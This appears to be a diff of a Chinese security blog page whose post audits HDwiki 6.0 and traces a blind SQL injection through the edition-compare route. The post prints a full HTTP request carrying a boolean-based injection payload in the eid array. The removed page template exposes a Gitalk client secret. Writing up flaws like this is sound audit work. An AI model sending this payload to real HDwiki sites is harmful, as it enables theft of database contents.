@@ -1,32 +1,17 @@
 <!DOCTYPE html>
-<html>
+<html lang=zh>
 <head>
-    
-
-    
-
-    
-
-
-
+    <!-- so meta -->
     <meta charset="utf-8">
-    
-    
-    
-    
-    <title>HDwiki6.0_sql盲注 | osword&#39;s blog | 小刀</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    
-    <meta name="theme-color" content="#3F51B5">
-    
-    
-    <meta name="keywords" content="代码审计">
-    <meta name="description" content="漏洞触发：control&#x2F;edition.php:147行 路由分析从index.php入口文件查看cms路由构造和全局变量过滤情况。 跟进model&#x2F;hdwiki.class.php:86行 第102行：只对get值进行过滤。第107行：表明cms的路由情况。 执行Payload类与方法调用情况根据第103行与$control-&gt;$method();进行">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="漏洞触发：control&#x2F;edition.php:147行 路由分析从index.php入口文件查看cms路由构造和全局变量过滤情况。 跟进model&#x2F;hdwiki.class.php:86行 第102行：只对get值进行过滤。第107行：表明cms的路由情况。 执行Payload类与方法调用情况根据第103行与$control-&gt;$method();进行  漏洞分析所以漏洞触发点路由构造为">
 <meta property="og:type" content="article">
 <meta property="og:title" content="HDwiki6.0_sql盲注">
 <meta property="og:url" content="http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/index.html">
 <meta property="og:site_name" content="osword&#39;s blog">
-<meta property="og:description" content="漏洞触发：control&#x2F;edition.php:147行 路由分析从index.php入口文件查看cms路由构造和全局变量过滤情况。 跟进model&#x2F;hdwiki.class.php:86行 第102行：只对get值进行过滤。第107行：表明cms的路由情况。 执行Payload类与方法调用情况根据第103行与$control-&gt;$method();进行">
+<meta property="og:description" content="漏洞触发：control&#x2F;edition.php:147行 路由分析从index.php入口文件查看cms路由构造和全局变量过滤情况。 跟进model&#x2F;hdwiki.class.php:86行 第102行：只对get值进行过滤。第107行：表明cms的路由情况。 执行Payload类与方法调用情况根据第103行与$control-&gt;$method();进行  漏洞分析所以漏洞触发点路由构造为">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/1.png">
 <meta property="og:image" content="http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/2.png">
@@ -41,527 +26,291 @@
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/1.png">
     
-        <link rel="alternate" type="application/atom+xml" title="osword&#39;s blog" href="/atom.xml">
     
-    <link rel="shortcut icon" href="/favicon.ico">
-    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
-    <script>window.lazyScripts=[]</script>
-
-    <!-- custom head -->
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
     
+    <!-- title -->
+    <title>HDwiki6.0_sql盲注</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
 
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="osword&#39;s blog" type="application/atom+xml" />
+    
 <meta name="generator" content="Hexo 4.2.1"></head>
 
-<body>
-    <div id="loading" class="active"></div>
-
-    <aside id="menu" class="hide" >
-  <div class="inner flex-row-vertical">
-    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
-        <i class="icon icon-lg icon-close"></i>
-    </a>
-    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
-      <div class="brand">
-        <a href="/" class="avatar waves-effect waves-circle waves-light">
-          <img src="/img/avatar.jpg">
-        </a>
-        <hgroup class="introduce">
-          <h5 class="nickname">osword</h5>
-          <a href="mailto:929337105@qq.com" title="929337105@qq.com" class="mail">929337105@qq.com</a>
-        </hgroup>
-      </div>
-    </div>
-    <div class="scroll-wrap flex-col">
-      <ul class="nav">
-        
-            <li class="waves-block waves-effect">
-              <a href="/"  >
-                <i class="icon icon-lg icon-home"></i>
-                主页
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="/archives"  >
-                <i class="icon icon-lg icon-archives"></i>
-                Archives
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://zhzhdoai.github.io/"  >
-                <i class="icon icon-lg icon-友链"></i>
-                友链
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://glotozz.github.io/" target="_blank" rel="noopener"  >
-                <i class="icon icon-lg icon-glotozz"></i>
-                Glotozz
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://nikoeurus.github.io/" target="_blank" rel="noopener"  >
-                <i class="icon icon-lg icon-sommus"></i>
-                Sommus
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://mochazz.github.io/" target="_blank" rel="noopener"  >
-                <i class="icon icon-lg icon-mochazz@七月火"></i>
-                Mochazz 七月火
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://tea9.xyz/" target="_blank" rel="noopener"  >
-                <i class="icon icon-lg icon-tea9"></i>
-                Tea 9
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://wulidecade.cn/" target="_blank" rel="noopener"  >
-                <i class="icon icon-lg icon-Decade"></i>
-                Decade
-              </a>
-            </li>
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
         
       </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/04/25/PHP%E7%B1%BB%E5%AD%A6%E4%B9%A0-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/&text=HDwiki6.0_sql盲注" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/&title=HDwiki6.0_sql盲注" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/&is_video=false&description=HDwiki6.0_sql盲注" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HDwiki6.0_sql盲注&body=Check out this article: http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/&title=HDwiki6.0_sql盲注" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/&title=HDwiki6.0_sql盲注" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/&title=HDwiki6.0_sql盲注" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/&title=HDwiki6.0_sql盲注" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/&name=HDwiki6.0_sql盲注&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/&t=HDwiki6.0_sql盲注" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
     </div>
-  </div>
-</aside>
-
-    <main id="main">
-        <header class="top-header" id="header">
-    <div class="flex-row">
-        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
-          <i class="icon icon-lg icon-navicon"></i>
-        </a>
-        <div class="flex-col header-title ellipsis">HDwiki6.0_sql盲注</div>
-        
-        <div class="search-wrap" id="search-wrap">
-            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
-                <i class="icon icon-lg icon-chevron-left"></i>
-            </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
-            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
-                <i class="icon icon-lg icon-search"></i>
-            </a>
-        </div>
-        
-        
-        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
-            <i class="icon icon-lg icon-share-alt"></i>
-        </a>
-        
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#路由分析"><span class="toc-number">1.</span> <span class="toc-text">路由分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞分析"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#array-slice"><span class="toc-number">2.1.</span> <span class="toc-text">array_slice</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Payload"><span class="toc-number">3.</span> <span class="toc-text">Payload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考链接："><span class="toc-number">4.</span> <span class="toc-text">参考链接：</span></a></li></ol>
     </div>
-</header>
-<header class="content-header post-header">
-
-    <div class="container fade-scale">
-        <h1 class="title">HDwiki6.0_sql盲注</h1>
-        <h5 class="subtitle">
-            
-                <time datetime="2019-04-25T11:30:55.000Z" itemprop="datePublished" class="page-time">
-  2019-04-25
-</time>
-
-
-            
-        </h5>
-    </div>
+  </span>
+</div>
 
     
-
-
-</header>
-
-
-<div class="container body-wrap">
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
     
-    <aside class="post-widget">
-        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
-            <h4>TOC</h4>
-            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#路由分析"><span class="post-toc-number">1.</span> <span class="post-toc-text">路由分析</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞分析"><span class="post-toc-number">2.</span> <span class="post-toc-text">漏洞分析</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#array-slice"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">array_slice</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Payload"><span class="post-toc-number">3.</span> <span class="post-toc-text">Payload</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#参考链接："><span class="post-toc-number">4.</span> <span class="post-toc-text">参考链接：</span></a></li></ol>
-        </nav>
-    </aside>
+    <h1 class="posttitle" itemprop="name headline">
+        HDwiki6.0_sql盲注
+    </h1>
 
 
-<article id="post-HDwiki6-0-sql盲注"
-  class="post-article article-type-post fade" itemprop="blogPost">
 
-    <div class="post-card">
-        <h1 class="post-card-title">HDwiki6.0_sql盲注</h1>
-        <div class="post-meta">
-            <time class="post-time" title="2019-04-25 19:30:55" datetime="2019-04-25T11:30:55.000Z"  itemprop="datePublished">2019-04-25</time>
-
-            
-
-
-            
-<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
-    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
-</span>
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">osword's blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-04-25T11:30:55.000Z" itemprop="datePublished">2019-04-25</time>
+        
+      
+    </div>
 
 
-        </div>
-        <div class="post-content" id="post-content" itemprop="postContent">
-            <p><strong>漏洞触发：control/edition.php:147行</strong></p>
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p><strong>漏洞触发：control/edition.php:147行</strong></p>
 <h1 id="路由分析"><a href="#路由分析" class="headerlink" title="路由分析"></a>路由分析</h1><p>从index.php入口文件查看cms路由构造和全局变量过滤情况。</p>
 <p>跟进model/hdwiki.class.php:86行</p>
 <p><strong>第102行：只对get值进行过滤。</strong><br><strong>第107行：表明cms的路由情况。</strong></p>
 <p>执行Payload类与方法调用情况根据第103行与<code>$control-&gt;$method();</code>进行</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="./1.png" alt=""></p>
 <h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>所以漏洞触发点路由构造为:<code>http://127.0.0.1/cms/HDwiki6.0/hdwiki/index.php?edition-compare</code></p>
 <p>跟进漏洞触发：<strong>control/edition.php:147行</strong>以post形式传入的参数只对键为0，1进行整数判断。<br>并通过<code>arrary_slice</code>取值传入sql中进行查询。</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./2.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="./2.png" alt=""></p>
 <h2 id="array-slice"><a href="#array-slice" class="headerlink" title="array_slice"></a>array_slice</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">array_slice ( array $array , int $offset [, int $length &#x3D; NULL [, bool $preserve_keys &#x3D; false ]] ) : array</span><br><span class="line">array_slice() 返回根据 offset 和 length 参数所指定的 array 数组中的一段序列。</span><br></pre></td></tr></table></figure>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./3.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-
+<p><img src="./3.png" alt=""></p>
 <p>跟进model/doc.class.php:978行get_edition方法。当eid为数组直接传入，直接进行sql查询</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./6.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="./6.png" alt=""></p>
 <h1 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;cms&#x2F;HDwiki6.0&#x2F;hdwiki&#x2F;?edition-compare HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;127.0.0.1&#x2F;cms&#x2F;HDwiki6.0&#x2F;hdwiki&#x2F;?edition-compare</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Cookie: hd_sid&#x3D;0thun8; hd_searchtime&#x3D;1556181631; PHPSESSID&#x3D;qpap19nk97soi6lfbo8ghp7oj2</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 78</span><br><span class="line"></span><br><span class="line">eid[2]&#x3D;1&amp;eid[3]&#x3D;1) or if(ascii(substr(user(),1,1))&#x3D;115,1,0)#&amp;eid[0]&#x3D;3&amp;eid[1]&#x3D;4</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./4.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./5.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-
+<p><img src="./4.png" alt=""><br><img src="./5.png" alt=""></p>
 <h1 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h1><p><a href="https://mochazz.github.io/2018/03/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BHDwiki6.0%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/" target="_blank" rel="noopener">https://mochazz.github.io/2018/03/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BHDwiki6.0%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/</a></p>
 <p><a href="https://xz.aliyun.com/t/2087" target="_blank" rel="noopener">https://xz.aliyun.com/t/2087</a></p>
 
-        </div>
-
-        <blockquote class="post-copyright">
-    
-    <div class="content">
-        
-<span class="post-time">
-    最后更新时间：<time datetime="2020-05-15T08:21:08.000Z" itemprop="dateUpdated">2020-05-15 16:21:08</time>
-</span><br>
-
-
-        
-        玩的开心
-        
-    </div>
-    
-    <footer>
-        <a href="http://zhzhdoai.github.io">
-            <img src="/img/avatar.jpg" alt="osword">
-            osword
-        </a>
-    </footer>
-</blockquote>
-
-        
-
-
-        <div class="post-footer">
-            
-	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-
-
-            
-<div class="page-share-wrap">
-    
-
-<div class="page-share" id="pageShare">
-    <ul class="reset share-icons">
-      <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/&title=《HDwiki6.0_sql盲注》 — osword's blog&pic=http://zhzhdoai.github.io/img/avatar.jpg" data-title="微博">
-          <i class="icon icon-weibo"></i>
-        </a>
-      </li>
-      <li>
-        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
-          <i class="icon icon-weixin"></i>
-        </a>
-      </li>
-      <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/&title=《HDwiki6.0_sql盲注》 — osword's blog&source=" data-title=" QQ">
-          <i class="icon icon-qq"></i>
-        </a>
-      </li>
-      <li>
-        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/" data-title=" Facebook">
-          <i class="icon icon-facebook"></i>
-        </a>
-      </li>
-      <li>
-        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《HDwiki6.0_sql盲注》 — osword's blog&url=http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/&via=http://zhzhdoai.github.io" data-title=" Twitter">
-          <i class="icon icon-twitter"></i>
-        </a>
-      </li>
-      <li>
-        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/" data-title=" Google+">
-          <i class="icon icon-google-plus"></i>
-        </a>
-      </li>
-    </ul>
- </div>
-
-
-
-    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
-        <i class="icon icon-share-alt icon-lg"></i>
-    </a>
-</div>
-
-
-
-        </div>
-    </div>
-
-    
-<nav class="post-nav flex-row flex-justify-between">
-  
-    <div class="waves-block waves-effect prev">
-      <a href="/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/" id="post-prev" class="post-nav-link">
-        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
-        <h4 class="title">第12届全国大学生信息安全竞赛_WEB</h4>
-      </a>
-    </div>
-  
-
-  
-    <div class="waves-block waves-effect next">
-      <a href="/2019/04/25/PHP%E7%B1%BB%E5%AD%A6%E4%B9%A0-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/" id="post-next" class="post-nav-link">
-        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
-        <h4 class="title">PHP类学习_魔术方法</h4>
-      </a>
-    </div>
-  
-</nav>
-
-
-
-    
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<section class="comments" id="comments">
-    <div id="gitalk-container"></div>
-    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
-    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
-    <script src="/js/md5.min.js"></script>
-    <script>
-        var gitalk = new Gitalk({
-            clientID: '7d7576c71632f14d639a',
-            clientSecret: '3d7f7e4c0e9a43a2cc5334d68aee612090df8b70',
-            repo: 'zhzhdoai.github.io',
-            owner: 'zhzhdoai',
-            admin: 'zhzhdoai',
-            id: md5(location.pathname),
-            perPage: 50,
-            distractionFreeMode: 'false'
-        })
-
-        gitalk.render('gitalk-container')
-    </script>
-</section>
-
-
-
+  </div>
 </article>
 
 
 
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#路由分析"><span class="toc-number">1.</span> <span class="toc-text">路由分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞分析"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#array-slice"><span class="toc-number">2.1.</span> <span class="toc-text">array_slice</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Payload"><span class="toc-number">3.</span> <span class="toc-text">Payload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考链接："><span class="toc-number">4.</span> <span class="toc-text">参考链接：</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/&text=HDwiki6.0_sql盲注" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/&title=HDwiki6.0_sql盲注" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/&is_video=false&description=HDwiki6.0_sql盲注" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HDwiki6.0_sql盲注&body=Check out this article: http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/&title=HDwiki6.0_sql盲注" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/&title=HDwiki6.0_sql盲注" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/&title=HDwiki6.0_sql盲注" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/&title=HDwiki6.0_sql盲注" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zhzhdoai.github.io/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/&name=HDwiki6.0_sql盲注&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
